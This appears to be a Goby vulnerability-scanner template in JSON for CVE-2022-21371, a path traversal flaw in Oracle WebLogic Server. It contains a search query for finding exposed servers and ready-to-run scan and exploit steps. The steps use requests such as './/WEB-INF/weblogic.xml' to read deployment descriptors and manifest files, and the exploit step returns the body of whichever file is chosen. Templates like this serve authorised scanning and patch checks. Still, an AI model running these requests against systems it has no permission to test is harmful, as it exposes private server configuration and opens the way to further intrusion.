{
      "Name": "Oracle WebLogic Server Path Traversal CVE-2022-21371 weblogic",
      "Level": "1",
      "Tags": [
            "pathtraversal"
      ],
      "GobyQuery": "app=\"oracle-weblogicportal\" || product=\"Oracle-WeblogicPortal\" || product=\"Weblogic_interface_7001\" || app=\"weblogic_interface_7001\"",
      "Description": "Oracle WebLogic Server is the industry leading application server for building enterprise applications using Java EE standards, and deploying them on a reliable, scalable runtime with low cost of ownership. It is strategically integrated with Oracle’s full product and cloud service portfolio. Oracle WebLogic Server provides compatibility with prior versions, and supports new features for developer productivity, high availability, manageability and deployment to cloud native Kubernetes-based environments.",
      "Product": "Oracle WebLogic",
      "Homepage": "https://www.oracle.com/middleware/technologies/weblogic.html",
      "Author": "",
      "Impact": "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Web Container). Supported versions that are affected are 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data. CVSS 3.1 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).",
      "Recommendation": "https://www.oracle.com/security-alerts/cpujan2022.html",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-21371",
            "https://www.oracle.com/security-alerts/cpujan2022.html"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "Path",
                  "Type": "select",
                  "Value": ".//META-INF/MANIFEST.MF,.//WEB-INF/web.xml,.//WEB-INF/portlet.xml,.//WEB-INF/weblogic.xml"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "OR",
            {
                  "Request": {
                        "method": "GET",
                        "uri": ".//WEB-INF/weblogic.xml",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "web-app",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": ".//WEB-INF/web.xml",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "xml",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "{{{Path}}}",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|concat|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}